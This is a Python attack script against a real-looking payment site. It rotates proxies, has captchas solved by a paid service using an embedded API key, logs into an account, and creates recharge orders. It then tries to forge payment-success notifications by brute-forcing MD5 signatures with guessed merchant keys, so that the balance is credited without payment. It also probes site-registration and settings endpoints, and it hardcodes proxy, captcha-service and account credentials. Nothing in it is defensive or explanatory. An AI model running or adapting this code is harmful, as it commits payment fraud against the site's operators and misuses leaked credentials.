#!/usr/bin/env python3
"""Recharge via GET (as JS does), dump pay channel, try notify forge; regsite bind."""
import json
import re
import subprocess
import time
import urllib.parse
import hashlib
from datetime import datetime
from pathlib import Path

BASE = "https://qq1.lol"
OUT = Path("/tmp/qq1_deep9")
LOG = OUT / "recharge_get.log"
HITS = OUT / "hits.jsonl"
JAR = str(OUT / "rg.jar")
KEY = "685ea1068774ca8f8e9a292a08da66d6"
QG, PW = "C413ED6D", "344F550A6F8B"
USER, PASS = "p4764923", "Test64923x"
_px = None


def log(m):
    line = f"[{datetime.now():%H:%M:%S}] {m}"
    print(line, flush=True)
    open(LOG, "a").write(line + "\n")


def hit(kind, detail, body=""):
    open(HITS, "a").write(json.dumps({"kind": kind, "detail": detail, "body": (body or "")[:8000]}, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:300]}")


def fresh():
    global _px
    for area in ("440000", "0", "330000"):
        try:
            d = json.loads(subprocess.check_output(
                ["curl", "-s", "--max-time", "10", f"https://share.proxy.qg.net/query?key={QG}"],
                text=True, timeout=12))
            if d.get("code") != "SUCCESS" or not d.get("data"):
                d = json.loads(subprocess.check_output(
                    ["curl", "-s", f"https://share.proxy.qg.net/get?key={QG}&num=1&area={area}"],
                    text=True, timeout=12))
            for x in d.get("data") or []:
                cand = f"http://{QG}:{PW}@{x['server']}"
                code = subprocess.run(
                    ["curl", "-sk", "--max-time", "10", "-x", cand, "-o", "/tmp/t9.out",
                     "-w", "%{http_code}", f"{BASE}/%61pi.php?act=siteinfo"],
                    capture_output=True, text=True, timeout=14).stdout.strip()
                if code == "200" and b"sitename" in open("/tmp/t9.out", "rb").read():
                    _px = cand
                    log(f"px {x['server']}")
                    return _px
        except Exception as e:
            log(f"px {e}")
        time.sleep(0.6)
    return _px


def curl(url, post=None, mt=22, referer=None):
    global _px
    if not _px:
        fresh()
    for _ in range(6):
        cmd = ["curl", "-sk", "--max-time", str(mt), "-x", _px, "-b", JAR, "-c", JAR,
               "-A", "Mozilla/5.0", "-H", f"Referer: {referer or BASE + '/user/recharge.php'}",
               "-H", "X-Requested-With: XMLHttpRequest",
               "-w", "\n__HTTP:%{http_code}"]
        if post is not None:
            body = urllib.parse.urlencode(post) if isinstance(post, dict) else str(post)
            cmd += ["-X", "POST", "--data-binary", body,
                    "-H", "Content-Type: application/x-www-form-urlencoded"]
        cmd.append(url)
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=mt + 8).stdout or ""
        if "authorization expired" in out or "__HTTP:" not in out:
            fresh()
            continue
        b, code = out.rsplit("__HTTP:", 1)
        return b.strip(), code.strip()
    return "", "000"


def solve(gt, challenge):
    task = {"type": "GeeTestTaskProxyless", "websiteURL": BASE + "/user/login.php",
            "gt": gt, "challenge": challenge}
    d = json.loads(subprocess.check_output(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", json.dumps({"clientKey": KEY, "task": task}),
         "https://api.2captcha.com/createTask"], text=True, timeout=35))
    if d.get("errorId"):
        raise RuntimeError(str(d))
    tid = d["taskId"]
    log(f"task {tid}")
    for _ in range(35):
        time.sleep(4)
        d = json.loads(subprocess.check_output(
            ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
             "-d", json.dumps({"clientKey": KEY, "taskId": tid}),
             "https://api.2captcha.com/getTaskResult"], text=True, timeout=25))
        if d.get("errorId"):
            raise RuntimeError(str(d))
        if d.get("status") == "ready":
            return d["solution"]
    raise RuntimeError("timeout")


def login():
    Path(JAR).unlink(missing_ok=True)
    curl(BASE + "/user/login.php")
    for attempt in range(6):
        try:
            cap_b, _ = curl(BASE + f"/ajax.php?act=captcha&t={int(time.time()*1000)}")
            cap = json.loads(cap_b)
            sol = solve(cap["gt"], cap["challenge"])
        except Exception as e:
            log(f"cap {e}")
            continue
        b, c = curl(BASE + "/user/ajax.php?act=login", {
            "user": USER, "pass": PASS,
            "geetest_challenge": sol.get("challenge") or cap["challenge"],
            "geetest_validate": sol.get("validate", ""),
            "geetest_seccode": sol.get("seccode") or (sol.get("validate", "") + "|jordan"),
        }, referer=BASE + "/user/login.php")
        log(f"login {attempt}: {c} {(b or '')[:160]}")
        if b and ("成功" in b or '"code":0' in b):
            return True
    return False


def main():
    open(LOG, "w").write("")
    log("=== RECHARGE GET ===")
    fresh()
    if not login():
        log("login fail"); return

    home, _ = curl(BASE + "/user/")
    m = re.search(r"余额：([0-9.]+)元", home or "")
    log(f"balance before: {m.group(1) if m else '?'}")

    # JS: GET ajax.php?act=recharge&type=X&value=Y
    trade_nos = []
    for value in ("1", "0.01", "10", "189"):
        for typ in ("alipay", "qqpay", "wxpay"):
            url = f"{BASE}/user/ajax.php?act=recharge&type={typ}&value={urllib.parse.quote(value)}"
            b, c = curl(url, referer=BASE + "/user/recharge.php")
            log(f"GET recharge type={typ} value={value}: {c} {(b or '')[:220]}")
            if c == "000":
                fresh()
                continue
            if b and '"code":0' in b:
                hit("recharge_created", f"{typ}/{value}", b)
                try:
                    tn = json.loads(b).get("trade_no")
                except Exception:
                    tn = None
                if tn:
                    trade_nos.append((tn, typ, value))
                    # follow submit
                    b2, c2 = curl(f"{BASE}/other/submit.php?type={typ}&orderid={tn}")
                    log(f"  submit: {c2} len={len(b2 or '')} {(b2 or '')[:200].replace(chr(10),' ')}")
                    (OUT / f"rg_submit_{typ}_{value}.html").write_text(b2 or "", errors="replace")
                    # extract JS location / form
                    for mm in re.finditer(r"(location\.href\s*=\s*['\"][^'\"]+|https?://[^\s\"'<>]+|pid[=:][\w]+|key[=:][\w]+)", b2 or "", re.I):
                        log(f"  extract: {mm.group(0)[:150]}")
                    # alipay.php
                    b3, c3 = curl(f"{BASE}/other/alipay.php?trade_no={tn}")
                    log(f"  alipay.php: {c3} len={len(b3 or '')}")
                    (OUT / f"rg_alipay_{tn}.html").write_text(b3 or "", errors="replace")
                    hdr = subprocess.run(
                        ["curl", "-skI", "--max-time", "15", "-x", _px, "-b", JAR,
                         f"{BASE}/other/alipay.php?trade_no={tn}"],
                        capture_output=True, text=True, timeout=20).stdout
                    log(f"  alipay hdr:\n{hdr[:600]}")
                    if b3 and len(b3) > 20:
                        hit("alipay_body", tn, b3[:3000])
            time.sleep(0.4)

    # forge notify
    for tn, typ, value in trade_nos[:3]:
        log(f"=== FORGE {tn} ===")
        for pid in ("1000", "1001", "1", "10001"):
            for key in ("", "123456", "key", "epay", "qq1", "buyi", "qqkqq", "faka", "admin"):
                params = {
                    "pid": pid, "trade_no": tn, "out_trade_no": tn,
                    "type": typ, "name": "recharge", "money": value,
                    "trade_status": "TRADE_SUCCESS",
                }
                s = "&".join(f"{k}={params[k]}" for k in sorted(params))
                for sign in [
                    hashlib.md5((s + key).encode()).hexdigest(),
                    hashlib.md5((s + "&key=" + key).encode()).hexdigest(),
                    hashlib.md5(f"{pid}{tn}{value}{key}".encode()).hexdigest(),
                ]:
                    params["sign"] = sign
                    params["sign_type"] = "MD5"
                    b, c = curl(BASE + "/other/epay_notify.php", params)
                    if b and b.strip().lower() in ("success", "ok"):
                        hit("NOTIFY_OK", f"{tn} pid={pid} key={key}", b)
                    b2, c2 = curl(BASE + "/other/alipay_notify.php", params)
                    if b2 and b2.strip().lower() in ("success", "ok"):
                        hit("ALIPAY_NOTIFY_OK", f"{tn} pid={pid} key={key}", b2)
                time.sleep(0.05)

    home, _ = curl(BASE + "/user/")
    m = re.search(r"余额：([0-9.]+)元", home or "")
    log(f"balance after: {m.group(1) if m else '?'}")

    # regsite / domain binding
    log("=== REGSITE ===")
    b, c = curl(BASE + "/user/regsite.php")
    log(f"regsite: {c} len={len(b or '')}")
    (OUT / "rg_regsite.html").write_text(b or "", errors="replace")
    if b:
        acts = sorted(set(re.findall(r"act=([a-zA-Z0-9_]+)", b)))
        log(f"  acts {acts}")
        for m in re.finditer(r"act=regsite[\s\S]{0,600}", b):
            log(f"  js: {m.group(0)[:400].replace(chr(10),' ')}")
        # try register with free/cheap tier
        csrf_m = re.search(r'csrf_token\s*=\s*"([^"]+)"', b)
        csrf = csrf_m.group(1) if csrf_m else None
        for payload in [
            {"kind": "0", "domain": "p4764923", "name": "test", "qq": "123456789"},
            {"kind": "1", "domain": "p4764923", "name": "test", "qq": "123456789"},
            {"zid": "482", "domain": "p4764923.qq1.lol"},
        ]:
            if csrf:
                payload["csrf_token"] = csrf
            b2, c2 = curl(BASE + "/user/ajax.php?act=regsite", payload)
            log(f"  regsite post {payload}: {c2} {(b2 or '')[:200]}")
            if b2 and "成功" in b2:
                hit("regsite_ok", str(payload), b2)

    # uset site settings for domain/apikey
    for mod in ("user", "site", "skimg"):
        b, c = curl(BASE + f"/user/uset.php?mod={mod}")
        log(f"uset {mod}: {c} len={len(b or '')}")
        (OUT / f"rg_uset_{mod}.html").write_text(b or "", errors="replace")
        for mm in re.finditer(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?', b or "", re.I):
            log(f"  input {mm.group(1)}={mm.group(2) or ''}")

    log("=== DONE ===")


if __name__ == "__main__":
    main()
